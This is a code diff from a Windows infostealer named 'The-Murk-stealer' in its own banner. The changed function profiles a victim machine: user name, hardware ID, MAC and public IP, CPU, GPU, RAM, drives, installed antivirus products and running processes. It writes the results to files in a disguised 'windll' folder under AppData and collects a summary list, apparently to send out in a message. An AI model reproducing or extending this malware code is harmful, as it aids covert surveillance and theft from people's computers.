@@ -18,8 +18,13 @@ import win32api
 import time
 import requests
 from win32com.client import GetObject
-logo = '''
-|-----------------------------------------------------------------------------|
+import getpass
+import subprocess
+"""
+logo
+"""
+
+logo = '''|-----------------------------------------------------------------------------|
 |       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       |
 |       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       |
 |       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       |
@@ -31,7 +36,7 @@ logo = '''
 |             https://github.com/Nick-Vinesmoke/The-Murk-stealer              |
 |-----------------------------------------------------------------------------|
 '''
-def SystemInfo():
+def SystemInfo(dataForMassage):
     try:
         pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
         def get_size(bytes, suffix="B"):
@@ -43,18 +48,25 @@ def SystemInfo():
 
         uname = platform.uname()
 
-        namepc = "\nPc name: " + str(uname.node)
-        countofcpu = psutil.cpu_count(logical=True)
-        allcpucount = "\nnumber of CPU cores:" + str(countofcpu) 
+        namepc = "\nPc name: " + str(uname.node)# get ps name
+        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
+                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+        user = getpass.getuser()
+        timeL = time.asctime()
+        ip = requests.get('https://api.ipify.org').text
+        interface, addrs = next(iter(psutil.net_if_addrs().items()))
+        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
+        mac = addrs[0].address
+        countofcpu = psutil.cpu_count(logical=True)# get cpu
+        allcpucount = str(countofcpu) # get number of CPU cores
 
         cpufreq = psutil.cpu_freq()
-        cpufreqincy = "\nCPU frequency: " + str(cpufreq.max) + 'Mhz'
 
 
         svmem = psutil.virtual_memory()
-        allram = "\nTotal RAM: " + str(get_size(svmem.total))
-        ramfree = "\nAvailable: " + str(get_size(svmem.available))
-        ramuseg = "\nUsed: " + str(get_size(svmem.used))
+        allram = str(get_size(svmem.total))# get Total RAM
+        ramfree = str(get_size(svmem.available))# get Available RAM
+        ramuseg = str(get_size(svmem.used))# get Used RAM
 
 
 
@@ -63,18 +75,21 @@ def SystemInfo():
 
 
         partitions = psutil.disk_partitions()
+        drivesData =[]
         for partition in partitions:
-            nameofdevice = "\nDrive: " + str(partition.device)
-            nameofdick = "\nDrive volume: " + str(partition.mountpoint)
-            typeoffilesystem = "\nFile system type: " + str(partition.fstype)
+            nameofdevice = str(partition.device)# get Drives
+            nameofdick = str(partition.mountpoint)# get Drive volume
+            typeoffilesystem = str(partition.fstype)# File system type
             try:
                 partition_usage = psutil.disk_usage(partition.mountpoint)
             except PermissionError:
 
                 continue
-            allstorage = "\nTotal memory: " + str(get_size(partition_usage.total))
-            usedstorage = "\nUsed: " + str(get_size(partition_usage.used))
-            freestorage = "\nAvailable: " + str(get_size(partition_usage.free))
+            allstorage = str(get_size(partition_usage.total))# get Total memory
+            usedstorage = str(get_size(partition_usage.used))# get Used
+            freestorage =  str(get_size(partition_usage.free))# get Total Available
+
+            drivesData.append(f"\nDrive: {nameofdevice}\nDrive volume: {nameofdick}\nFile system type: {typeoffilesystem}\nTotal memory: {allstorage}\nUsed: {usedstorage}\nAvailable: {freestorage}\n")
 
 
 
@@ -83,17 +98,20 @@ def SystemInfo():
             list_gpus = []
             for gpu in gpus:
 
-                gpu_name = "\nType of GPU: " + gpu.name
+                gpu_name = gpu.name# get Type of GPU
+                gpu_free_memory = f"{gpu.memoryFree}MB"# get Available GPU memory
+                gpu_total_memory = f"{gpu.memoryTotal}MB"# get Total GPU memory
+                gpu_used_memory = f"{int(gpu.memoryTotal)-int(gpu.memoryFree)}MB"
+                gpu_temperature = f"{gpu.temperature} °C\n"# get GPU temperature
 
-                gpu_free_memory = "\nAvailable GPU memory: " + f"{gpu.memoryFree}MB"
-
-                gpu_total_memory = "\nTotal GPU memory: " f"{gpu.memoryTotal}MB"
-
-                gpu_temperature = "\nGPU temperature: " f"{gpu.temperature} °C"
+                Thisgpu = f'\nGPU: {gpu_name}\nTotal GPU memory {gpu_total_memory}\nAvailable GPU memory: {gpu_free_memory}\nGPU used memory: {gpu_used_memory}\nGPU temperature: {gpu_temperature}\n'
+                list_gpus.append(Thisgpu)
         except:
-            print('No GPU')
+            list_gpus.append('No GPU')
 
-
+        """
+        all needed paths
+        """
         Antiviruses = {
             'C:\\Program Files\\Windows Defender': 'Windows Defender',
             'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
@@ -127,23 +145,36 @@ def SystemInfo():
         except Exception as e:
             print(e)
         try:
-            all_data = "Time: " + time.asctime() + '\n' + "CPU: " + platform.processor() + '\n' + "OS type: " + platform.system() + ' ' + platform.release() + '\nLocation and IP:' + location1 + '\nDrives:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
+            all_data = f'\n\nUser: {user}\nPc name: {namepc}\nOS type: {platform.system()} {platform.release()}\nHwid: {hwid}\nMac: {mac}\nTime: {timeL}\nIP: {ip}\nLocation and IP {location1}\n\n\nCPU: {cpu}\nNumber of CPU cores: {allcpucount}\nCPU frequency: min[{str(cpufreq.min)}Mhz]; max[{str(cpufreq.max)}Mhz]\n\n'
+            for gpus in list_gpus:
+                all_data+=gpus
+            all_data+= f'\n\nRAM: {allram}\nAvailable RAM: {ramfree}\nUsed RAM: {ramuseg}\n\n'
+            for data in drivesData:
+                all_data+=data
+            all_data+= f'\n\nAntiviruses: {Antiviruses}'
+
+
             file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
             file.write(logo)
             file.write(all_data)
-            file.write('\nAntiviruses: '+str(Antiviruses))
+            dataForMassage.append(timeL)
+            dataForMassage.append(platform.system()+ platform.release())
+            dataForMassage.append(str(uname.node))
+            dataForMassage.append(user)
+            dataForMassage.append(cpu)
+            dataForMassage.append(gpu.name)
+            dataForMassage.append(ip)
+            dataForMassage.append(str(Antiviruses))
         except Exception as e:
             print(e)
-        try:
-            file.write(str(gpu_name) + str(gpu_free_memory) + str(gpu_total_memory) + str(gpu_temperature))
-        except:
-            pass
 
         file.close()
         fileproc = open(rf'{pathtofolder}\windll\System\Processes.txt', 'a', encoding='utf-8')
         result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
         fileproc.write("\n".join(process for process in result))
         fileproc.close()
+        print("sys info done")
+        return dataForMassage
     except Exception as e:
         print(e)
 
